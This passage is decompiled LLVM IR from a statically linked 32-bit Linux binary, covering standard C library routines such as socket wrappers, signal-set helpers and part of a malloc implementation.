  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805351b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8053522 = call i32 @__socketcall(i32 15, i32 %v2_805351b)
  ret i32 %v2_8053522

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805354f = ptrtoint i32* %stack_var_-16 to i32
  %v2_8053556 = call i32 @__socketcall(i32 10, i32 %v2_805354f)
  ret i32 %v2_8053556

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8053583 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805358a = call i32 @__socketcall(i32 9, i32 %v2_8053583)
  ret i32 %v2_805358a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_80535c7 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80535ce = call i32 @__socketcall(i32 11, i32 %v2_80535c7)
  ret i32 %v2_80535ce

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8053603 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805360a = call i32 @__socketcall(i32 14, i32 %v2_8053603)
  ret i32 %v2_805360a

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805362f = ptrtoint i32* %stack_var_-12 to i32
  %v2_8053636 = call i32 @__socketcall(i32 1, i32 %v2_805362f)
  ret i32 %v2_8053636

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8053658, label %dec_label_pc_805364b

dec_label_pc_805364b:                             ; preds = %entry
  %v1_805364b = add i32 %arg1, -64
  %v3_805364b = sub i32 63, %arg1
  %v4_805364b = and i32 %v3_805364b, %arg1
  %v5_805364b = icmp slt i32 %v4_805364b, 0
  %v6_805364b = icmp eq i32 %v1_805364b, 0
  %v7_805364b = icmp slt i32 %v1_805364b, 0
  %v3_805364e = icmp eq i1 %v7_805364b, %v5_805364b
  %v4_805364e = icmp eq i1 %v6_805364b, false
  %v5_805364e = and i1 %v4_805364e, %v3_805364e
  br i1 %v5_805364e, label %dec_label_pc_8053658, label %dec_label_pc_8053650

dec_label_pc_8053650:                             ; preds = %dec_label_pc_805364b
  %v4_8053653 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8053658

dec_label_pc_8053658:                             ; preds = %dec_label_pc_805364b, %entry, %dec_label_pc_8053650
  %v1_8053658 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805365d = inttoptr i32 %v1_8053658 to i32*
  store i32 22, i32* %v1_805365d, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805364b, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8053658, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805367a = inttoptr i32 %arg1 to i8*
  %v4_805367a = call i32 @__GI_memset(i8* %v3_805367a, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8053688 = load i32, i32* @ebx, align 4
  %v15_8053689 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_805369d = icmp eq i32 %arg2, -1
  br i1 %v10_805369d, label %dec_label_pc_80536ab, label %dec_label_pc_80536a2

dec_label_pc_80536a2:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_80536ab, label %dec_label_pc_80536a6

dec_label_pc_80536a6:                             ; preds = %dec_label_pc_80536a2
  %v7_80536a9 = icmp sgt i32 %arg1, 64
  br i1 %v7_80536a9, label %dec_label_pc_80536ab, label %dec_label_pc_80536b8

dec_label_pc_80536ab:                             ; preds = %dec_label_pc_80536a6, %dec_label_pc_80536a2, %entry
  %v1_80536ab = call i32 @__errno_location(i32 %v0_8053688)
  store i32 %v1_80536ab, i32* %eax.global-to-local, align 4
  %v1_80536b0 = inttoptr i32 %v1_80536ab to i32*
  store i32 22, i32* %v1_80536b0, align 4
  br label %dec_label_pc_805372c

dec_label_pc_80536b8:                             ; preds = %dec_label_pc_80536a6
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536c6

dec_label_pc_80536c6:                             ; preds = %dec_label_pc_80536c6.dec_label_pc_80536c6_crit_edge, %dec_label_pc_80536b8
  %v0_80536c6 = phi i32 [ %v15_8053689, %dec_label_pc_80536b8 ], [ %v0_80536c6.pre, %dec_label_pc_80536c6.dec_label_pc_80536c6_crit_edge ]
  %v1_80536d117 = phi i32 [ 31, %dec_label_pc_80536b8 ], [ %v1_80536d1, %dec_label_pc_80536c6.dec_label_pc_80536c6_crit_edge ]
  %v2_80536c6 = mul i32 %v1_80536d117, 4
  %v3_80536c6 = add i32 %v2_80536c6, 160
  %v4_80536c6 = add i32 %v3_80536c6, %v0_80536c6
  %v5_80536c6 = inttoptr i32 %v4_80536c6 to i32*
  store i32 0, i32* %v5_80536c6, align 4
  %v0_80536d1.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80536d1 = add i32 %v0_80536d1.pre, -1
  %v9_80536d1 = icmp slt i32 %v1_80536d1, 0
  store i32 %v1_80536d1, i32* %eax.global-to-local, align 4
  %v1_80536d2 = icmp eq i1 %v9_80536d1, false
  br i1 %v1_80536d2, label %dec_label_pc_80536c6.dec_label_pc_80536c6_crit_edge, label %dec_label_pc_80536d4

dec_label_pc_80536c6.dec_label_pc_80536c6_crit_edge: ; preds = %dec_label_pc_80536c6
  %v0_80536c6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80536c6

dec_label_pc_80536d4:                             ; preds = %dec_label_pc_80536c6
  %v0_80536d4 = load i32, i32* @edx, align 4
  %v2_80536d7 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_80536d7, i32* %eax.global-to-local, align 4
  %v4_80536df = call i32 @__sigaddset(i32 %v2_80536d7, i32 %arg1, i32 %v0_80536d4, i32 %v0_80536d4)
  store i32 %v4_80536df, i32* %eax.global-to-local, align 4
  %v2_80536e7 = icmp slt i32 %v4_80536df, 0
  br i1 %v2_80536e7, label %dec_label_pc_805372c, label %dec_label_pc_80536eb

dec_label_pc_80536eb:                             ; preds = %dec_label_pc_80536d4
  %v4_80536f3 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_80627c0.500 to i32), i32 %arg1, i32 %v4_80536df, i32 %v4_80536df)
  %v2_805370c = ptrtoint i32* %stack_var_-284 to i32
  %v2_8053711 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8053711, i32* %eax.global-to-local, align 4
  %v4_805371a = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_805370c)
  store i32 %v4_805371a, i32* %eax.global-to-local, align 4
  %v2_8053722 = icmp slt i32 %v4_805371a, 0
  br i1 %v2_8053722, label %dec_label_pc_805372c, label %dec_label_pc_8053726

dec_label_pc_8053726:                             ; preds = %dec_label_pc_80536eb
  %v3_8053726 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_805372f

dec_label_pc_805372c:                             ; preds = %dec_label_pc_80536eb, %dec_label_pc_80536d4, %dec_label_pc_80536ab
  br label %dec_label_pc_805372f

dec_label_pc_805372f:                             ; preds = %dec_label_pc_8053726, %dec_label_pc_805372c
  %storemerge = phi i32 [ -1, %dec_label_pc_805372c ], [ %v3_8053726, %dec_label_pc_8053726 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053688, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80536d1, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 4, 1, 3, 0, 5 }
  uselistorder label %dec_label_pc_805372f, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8053746 = add i32 %arg2, -1
  %v1_8053749 = urem i32 %v1_8053746, 32
  %v2_8053749 = icmp eq i32 %v1_8053749, 0
  %v2_805374c = udiv i32 %v1_8053746, 32
  br i1 %v2_8053749, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_805374f = shl i32 1, %v1_8053749
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8053751 = phi i32 [ 1, %entry ], [ %v5_805374f, %bb ]
  %v2_8053751 = mul nuw nsw i32 %v2_805374c, 4
  %v3_8053751 = add i32 %v2_8053751, %arg1
  %v4_8053751 = inttoptr i32 %v3_8053751 to i32*
  %v5_8053751 = load i32, i32* %v4_8053751, align 4
  %v7_8053751 = and i32 %v5_8053751, %v6_8053751
  %v8_8053751 = icmp eq i32 %v7_8053751, 0
  %v1_8053755 = icmp eq i1 %v8_8053751, false
  %v2_8053755 = zext i1 %v1_8053755 to i32
  ret i32 %v2_8053755

; uselistorder directives
  uselistorder i32 %v1_8053749, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805375c = load i32, i32* @ebx, align 4
  store i32 %v0_805375c, i32* %stack_var_-4, align 4
  %v1_805376a = add i32 %arg2, -1
  %v1_805376d = urem i32 %v1_805376a, 32
  %v2_805376d = icmp eq i32 %v1_805376d, 0
  store i32 %v1_805376d, i32* @ecx, align 4
  br i1 %v2_805376d, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_8053770 = shl i32 1, %v1_805376d
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8053775 = phi i32 [ 1, %entry ], [ %v5_8053770, %bb ]
  %v2_8053772 = udiv i32 %v1_805376a, 32
  store i32 %v2_8053772, i32* @edx, align 4
  %v2_8053775 = mul nuw nsw i32 %v2_8053772, 4
  %v3_8053775 = add i32 %v2_8053775, %arg1
  %v4_8053775 = inttoptr i32 %v3_8053775 to i32*
  %v5_8053775 = load i32, i32* %v4_8053775, align 4
  %v7_8053775 = or i32 %v5_8053775, %v6_8053775
  store i32 %v7_8053775, i32* %v4_8053775, align 4
  %v2_805377a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805377a, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8053772, { 1, 0 }
  uselistorder i32 %v1_805376d, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805378a = add i32 %arg2, -1
  %v1_805378d = urem i32 %v1_805378a, 32
  %v2_805378d = icmp eq i32 %v1_805378d, 0
  br i1 %v2_805378d, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_8053790 = shl i32 -2, %v1_805378d
  %v5_8053790 = sub nsw i32 32, %v1_805378d
  %v6_8053790 = lshr i32 -2, %v5_8053790
  %v7_8053790 = or i32 %v6_8053790, %v4_8053790
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8053795 = phi i32 [ -2, %entry ], [ %v7_8053790, %bb ]
  %v2_8053792 = udiv i32 %v1_805378a, 32
  %v2_8053795 = mul nuw nsw i32 %v2_8053792, 4
  %v3_8053795 = add i32 %v2_8053795, %arg1
  %v4_8053795 = inttoptr i32 %v3_8053795 to i32*
  %v5_8053795 = load i32, i32* %v4_8053795, align 4
  %v7_8053795 = and i32 %v5_8053795, %v6_8053795
  store i32 %v7_8053795, i32* %v4_8053795, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_805378d, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_805379c = load i32, i32* @eax, align 4
  %v6_80537af = icmp ugt i32 %v0_805379c, 16777215
  br i1 %v6_80537af, label %dec_label_pc_80537c0, label %dec_label_pc_80537b1

dec_label_pc_80537b1:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_805379c, 256
  %v2_805379e = udiv i32 %v0_805379c, 256
  %v2_80537b1 = call i32 @llvm.ctlz.i32(i32 %v2_805379e, i1 true)
  %v3_80537b1 = xor i32 %v2_80537b1, 31
  %v5_80537b1 = select i1 %tmp, i32 95, i32 %v3_80537b1
  %v1_80537b4 = add nuw nsw i32 %v5_80537b1, 6
  store i32 %v1_80537b4, i32* @ecx, align 4
  %v2_80537b7 = urem i32 %v1_80537b4, 32
  %v4_80537b7 = icmp eq i32 %v2_80537b7, 0
  br i1 %v4_80537b7, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_80537b1
  %v5_80537b7 = lshr i32 %v0_805379c, %v2_80537b7
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80537b1, %bb
  %v0_80537b9 = phi i32 [ %v0_805379c, %dec_label_pc_80537b1 ], [ %v5_80537b7, %bb ]
  %v1_80537b9 = urem i32 %v0_80537b9, 4
  %v2_80537bc = mul nuw nsw i32 %v5_80537b1, 4
  %v3_80537bc = or i32 %v1_80537b9, 32
  %v4_80537bc = add nuw nsw i32 %v3_80537bc, %v2_80537bc
  br label %dec_label_pc_80537c0

dec_label_pc_80537c0:                             ; preds = %entry, %bb4
  %v0_80537c1 = phi i32 [ 95, %entry ], [ %v4_80537bc, %bb4 ]
  ret i32 %v0_80537c1

; uselistorder directives
  uselistorder i32 %v2_80537b7, { 1, 0 }
  uselistorder i32 %v0_805379c, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_80537c0, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80537c2 = load i32, i32* @ebp, align 4
  %v0_80537c3 = load i32, i32* @edi, align 4
  %v0_80537c4 = load i32, i32* @esi, align 4
  %v0_80537c5 = load i32, i32* @ebx, align 4
  store i32 %v0_80537c5, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80537d7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80537d7, i32* @eax, align 4
  store i32 %v2_80537d7, i32* %stack_var_-92, align 4
  %v2_80537dc = call i32 @__pthread_return_void(i32 %v2_80537d7, i32 134566343)
  store i32 %v2_80537dc, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805c3d0.501 to i32), i32* %stack_var_-92, align 4
  %v1_80537e8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c3d0.501 to i32))
  store i32 %v1_80537e8, i32* %eax.global-to-local, align 4
  %v0_80537f0 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_80537f0, -32
  br i1 %tmp, label %dec_label_pc_8053807, label %dec_label_pc_80537f5

dec_label_pc_80537f5:                             ; preds = %entry
  %v0_80537f5 = load i32, i32* %stack_var_-92, align 4
  %v1_80537f5 = call i32 @__errno_location(i32 %v0_80537f5)
  store i32 %v1_80537f5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80537fc = inttoptr i32 %v1_80537f5 to i32*
  store i32 12, i32* %v1_80537fc, align 4
  br label %dec_label_pc_8053f5a

dec_label_pc_8053807:                             ; preds = %entry
  %v1_8053807 = add i32 %v0_80537f0, 11
  %tmp136 = icmp ult i32 %v1_8053807, 16
  br i1 %tmp136, label %dec_label_pc_805381e, label %dec_label_pc_8053817

dec_label_pc_8053817:                             ; preds = %dec_label_pc_8053807
  %v1_8053817 = and i32 %v1_8053807, -8
  br label %dec_label_pc_805381e

dec_label_pc_805381e:                             ; preds = %dec_label_pc_8053807, %dec_label_pc_8053817
  %storemerge133 = phi i32 [ %v1_8053817, %dec_label_pc_8053817 ], [ %v1_8053807, %dec_label_pc_8053807 ]
  %v1_8053bbe = phi i32 [ %v1_8053817, %dec_label_pc_8053817 ], [ 16, %dec_label_pc_8053807 ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_805381e = load i8, i8* @global_var_8062840.502, align 1
  %v1_805381e = sext i8 %v0_805381e to i32
  store i32 %v1_805381e, i32* @ebx, align 4
  %v3_8053824 = urem i8 %v0_805381e, 2
  %v4_8053824 = icmp eq i8 %v3_8053824, 0
  %v1_8053827 = icmp eq i1 %v4_8053824, false
  br i1 %v1_8053827, label %dec_label_pc_8053846, label %dec_label_pc_8053829

dec_label_pc_8053829:                             ; preds = %dec_label_pc_805381e
  %v2_8053829 = icmp eq i8 %v0_805381e, 0
  %v1_805382b = icmp eq i1 %v2_8053829, false
  br i1 %v1_805382b, label %dec_label_pc_8053b29, label %dec_label_pc_8053831

dec_label_pc_8053831:                             ; preds = %dec_label_pc_8053829
  store i32 ptrtoint (i8* @global_var_8062840.502 to i32), i32* %stack_var_-92, align 4
  %v2_8053839 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8062840.502 to i32*))
  store i32 %v2_8053839, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b29

dec_label_pc_8053846:                             ; preds = %dec_label_pc_805381e
  %v11_8053846 = trunc i32 %v1_8053bbe to i8
  %v8_805384a = icmp ugt i8 %v11_8053846, %v0_805381e
  br i1 %v8_805384a, label %dec_label_pc_8053867, label %dec_label_pc_805384c

dec_label_pc_805384c:                             ; preds = %dec_label_pc_8053846
  %v2_8053850 = udiv i32 %v1_8053bbe, 2
  store i32 %v2_8053850, i32* %eax.global-to-local, align 4
  %v1_8053852 = add i32 %v2_8053850, ptrtoint (i8* @global_var_8062840.502 to i32)
  store i32 %v1_8053852, i32* @ecx, align 4
  %v1_8053858 = add i32 %v2_8053850, add (i32 ptrtoint (i8* @global_var_8062840.502 to i32), i32 -4)
  %v2_8053858 = inttoptr i32 %v1_8053858 to i32*
  %v3_8053858 = load i32, i32* %v2_8053858, align 4
  store i32 %v3_8053858, i32* @edx, align 4
  %v1_805385b = icmp eq i32 %v3_8053858, 0
  br i1 %v1_805385b, label %dec_label_pc_8053867, label %dec_label_pc_805385f

dec_label_pc_805385f:                             ; preds = %dec_label_pc_805384c
  %v1_805385f = add i32 %v3_8053858, 8
  %v2_805385f = inttoptr i32 %v1_805385f to i32*
  %v3_805385f = load i32, i32* %v2_805385f, align 4
  store i32 %v3_805385f, i32* %eax.global-to-local, align 4
  store i32 %v3_805385f, i32* %v2_8053858, align 4
  br label %dec_label_pc_80538a0

dec_label_pc_8053867:                             ; preds = %dec_label_pc_805384c, %dec_label_pc_8053846
  %v8_8053867 = icmp ult i32 %v1_8053bbe, 255
  %v6_805386f = icmp ugt i32 %v1_8053bbe, 255
  store i32 %v1_8053bbe, i32* @eax, align 4
  br i1 %v6_805386f, label %dec_label_pc_80538a8, label %dec_label_pc_8053871

dec_label_pc_8053871:                             ; preds = %dec_label_pc_8053867
  %v2_8053875 = udiv i32 %v1_8053bbe, 8
  store i32 %v2_8053875, i32* %eax.global-to-local, align 4
  %v1_8053878 = mul nuw i32 %v2_8053875, 8
  %v2_8053878 = add i32 %v1_8053878, ptrtoint (i32* @global_var_806286c.503 to i32)
  store i32 %v2_8053878, i32* @ecx, align 4
  %v1_8053883 = add i32 %v1_8053878, add (i32 ptrtoint (i32* @global_var_806286c.503 to i32), i32 12)
  %v2_8053883 = inttoptr i32 %v1_8053883 to i32*
  %v3_8053883 = load i32, i32* %v2_8053883, align 4
  store i32 %v3_8053883, i32* @edx, align 4
  %v12_8053886 = icmp eq i32 %v3_8053883, %v2_8053878
  br i1 %v12_8053886, label %dec_label_pc_80539a4.preheader, label %dec_label_pc_805388e

dec_label_pc_805388e:                             ; preds = %dec_label_pc_8053871
  store i32 %v1_8053bbe, i32* %ebx.global-to-local, align 4
  %v1_8053892 = add i32 %v3_8053883, 12
  %v2_8053892 = inttoptr i32 %v1_8053892 to i32*
  %v3_8053892 = load i32, i32* %v2_8053892, align 4
  store i32 %v3_8053892, i32* %eax.global-to-local, align 4
  %v2_8053895 = or i32 %v1_8053bbe, 4
  %v3_8053895 = add i32 %v3_8053883, %v2_8053895
  %v4_8053895 = inttoptr i32 %v3_8053895 to i32*
  %v5_8053895 = load i32, i32* %v4_8053895, align 4
  %v6_8053895 = or i32 %v5_8053895, 1
  store i32 %v6_8053895, i32* %v4_8053895, align 4
  %v0_805389a = load i32, i32* %eax.global-to-local, align 4
  %v1_805389a = load i32, i32* @ecx, align 4
  %v2_805389a = add i32 %v1_805389a, 12
  %v3_805389a = inttoptr i32 %v2_805389a to i32*
  store i32 %v0_805389a, i32* %v3_805389a, align 4
  %v0_805389d = load i32, i32* @ecx, align 4
  %v1_805389d = load i32, i32* %eax.global-to-local, align 4
  %v2_805389d = add i32 %v1_805389d, 8
  %v3_805389d = inttoptr i32 %v2_805389d to i32*
  store i32 %v0_805389d, i32* %v3_805389d, align 4
  br label %dec_label_pc_80538a0

dec_label_pc_80538a0:                             ; preds = %dec_label_pc_805385f, %dec_label_pc_805388e
  %v0_80538a0 = load i32, i32* @edx, align 4
  %v1_80538a0 = add i32 %v0_80538a0, 8
  store i32 %v1_80538a0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053f49

dec_label_pc_80538a8:                             ; preds = %dec_label_pc_8053867
  %v0_80538ac = call i32 @__malloc_largebin_index()
  store i32 %v0_80538ac, i32* %eax.global-to-local, align 4
  %v3_80538b1 = and i8 %v0_805381e, 2
  %v4_80538b1 = icmp eq i8 %v3_80538b1, 0
  br i1 %v4_80538b1, label %dec_label_pc_80539a4.preheader, label %dec_label_pc_80538be

dec_label_pc_80538be:                             ; preds = %dec_label_pc_80538a8
  store i32 ptrtoint (i8* @global_var_8062840.502 to i32), i32* %stack_var_-92, align 4
  %v2_80538c6 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8062840.502 to i32*))
  store i32 %v2_80538c6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80539a4.preheader

dec_label_pc_80539a4.preheader:                   ; preds = %dec_label_pc_80538be, %dec_label_pc_8053871, %dec_label_pc_80538a8
  %stack_var_-40.0.ph = phi i32 [ %v2_8053875, %dec_label_pc_8053871 ], [ %v0_80538ac, %dec_label_pc_80538be ], [ %v0_80538ac, %dec_label_pc_80538a8 ]
  %v1_80538fa = add i32 %v1_8053bbe, 16
  %v0_80539a4109 = load i32, i32* @global_var_8062880.506, align 128
  store i32 %v0_80539a4109, i32* @ebp, align 4
  %v9_80539aa115 = icmp eq i32 %v0_80539a4109, 134621300
  %v1_80539b0117 = icmp eq i1 %v9_80539aa115, false
  br i1 %v1_80539b0117, label %dec_label_pc_80538d3, label %dec_label_pc_80539b6

dec_label_pc_80538d3:                             ; preds = %dec_label_pc_80539a4.preheader, %bb82
  %v0_80539a4118 = phi i32 [ %v0_80539a4, %bb82 ], [ %v0_80539a4109, %dec_label_pc_80539a4.preheader ]
  %v1_80538d3 = add i32 %v0_80539a4118, 4
  %v2_80538d3 = inttoptr i32 %v1_80538d3 to i32*
  %v3_80538d3 = load i32, i32* %v2_80538d3, align 4
  %v1_80538d6 = add i32 %v0_80539a4118, 12
  %v2_80538d6 = inttoptr i32 %v1_80538d6 to i32*
  %v3_80538d6 = load i32, i32* %v2_80538d6, align 4
  store i32 %v3_80538d6, i32* @edx, align 4
  %v1_80538d9 = and i32 %v3_80538d3, -4
  store i32 %v1_80538d9, i32* @edi, align 4
  br i1 %v6_805386f, label %dec_label_pc_8053905, label %dec_label_pc_80538e6

dec_label_pc_80538e6:                             ; preds = %dec_label_pc_80538d3
  %v9_80538e6 = icmp eq i32 %v3_80538d6, 134621300
  %v1_80538ec = icmp eq i1 %v9_80538e6, false
  br i1 %v1_80538ec, label %dec_label_pc_8053905, label %dec_label_pc_80538ee

dec_label_pc_80538ee:                             ; preds = %dec_label_pc_80538e6
  %v1_80538ee = load i32, i32* @global_var_8062870.504, align 16
  %v12_80538ee = icmp eq i32 %v0_80539a4118, %v1_80538ee
  %v1_80538f4 = icmp eq i1 %v12_80538ee, false
  br i1 %v1_80538f4, label %dec_label_pc_8053905, label %dec_label_pc_80538f6

dec_label_pc_80538f6:                             ; preds = %dec_label_pc_80538ee
  store i32 %v1_80538fa, i32* %eax.global-to-local, align 4
  %v6_80538ff = icmp ugt i32 %v1_80538d9, %v1_80538fa
  br i1 %v6_80538ff, label %dec_label_pc_8053ee4, label %dec_label_pc_8053905

dec_label_pc_8053905:                             ; preds = %dec_label_pc_80538f6, %dec_label_pc_80538ee, %dec_label_pc_80538e6, %dec_label_pc_80538d3
  store i32 ptrtoint (i32* @global_var_8062874.505 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_80538d6, i32* @global_var_8062880.506, align 4
  %v2_805390d = add i32 %v3_80538d6, 8
  %v3_805390d = inttoptr i32 %v2_805390d to i32*
  store i32 ptrtoint (i32* @global_var_8062874.505 to i32), i32* %v3_805390d, align 4
  %v0_8053910 = load i32, i32* @edi, align 4
  %v15_8053910 = icmp eq i32 %v0_8053910, %v1_8053bbe
  br i1 %v15_8053910, label %dec_label_pc_8053f25, label %dec_label_pc_805391a

dec_label_pc_805391a:                             ; preds = %dec_label_pc_8053905
  %v6_8053920 = icmp ugt i32 %v0_8053910, 255
  br i1 %v6_8053920, label %dec_label_pc_8053933, label %dec_label_pc_8053922

dec_label_pc_8053922:                             ; preds = %dec_label_pc_805391a
  %v2_8053924 = udiv i32 %v0_8053910, 8
  store i32 %v2_8053924, i32* %esi.global-to-local, align 4
  %v1_8053927 = mul nuw i32 %v2_8053924, 8
  %v2_8053927 = add i32 %v1_8053927, 134621292
  store i32 %v2_8053927, i32* @ebx, align 4
  %v1_805392e = add i32 %v1_8053927, 134621300
  %v2_805392e = inttoptr i32 %v1_805392e to i32*
  %v3_805392e = load i32, i32* %v2_805392e, align 4
  store i32 %v3_805392e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805397c

dec_label_pc_8053933:                             ; preds = %dec_label_pc_805391a
  store i32 %v0_8053910, i32* @eax, align 4
  %v0_8053935 = call i32 @__malloc_largebin_index()
  store i32 %v0_8053935, i32* %esi.global-to-local, align 4
  %v1_805393c = mul i32 %v0_8053935, 8
  %v2_805393c = add i32 %v1_805393c, ptrtoint (i32* @global_var_806286c.503 to i32)
  store i32 %v2_805393c, i32* %eax.global-to-local, align 4
  %v1_8053943 = add i32 %v1_805393c, add (i32 ptrtoint (i32* @global_var_806286c.503 to i32), i32 8)
  %v2_8053943 = inttoptr i32 %v1_8053943 to i32*
  %v3_8053943 = load i32, i32* %v2_8053943, align 4
  store i32 %v3_8053943, i32* %edx.global-to-local, align 4
  %v12_8053946 = icmp eq i32 %v3_8053943, %v2_805393c
  store i32 %v3_8053943, i32* @ebx, align 4
  br i1 %v12_8053946, label %dec_label_pc_805397c, label %dec_label_pc_8053950

dec_label_pc_8053950:                             ; preds = %dec_label_pc_8053933
  %v1_8053950 = add i32 %v1_805393c, add (i32 ptrtoint (i32* @global_var_806286c.503 to i32), i32 12)
  %v2_8053950 = inttoptr i32 %v1_8053950 to i32*
  %v3_8053950 = load i32, i32* %v2_8053950, align 4
  store i32 %v3_8053950, i32* @ebx, align 4
  %v0_8053953 = load i32, i32* @edi, align 4
  %v2_8053953 = add i32 %v3_8053950, 4
  %v3_8053953 = inttoptr i32 %v2_8053953 to i32*
  %v4_8053953 = load i32, i32* %v3_8053953, align 4
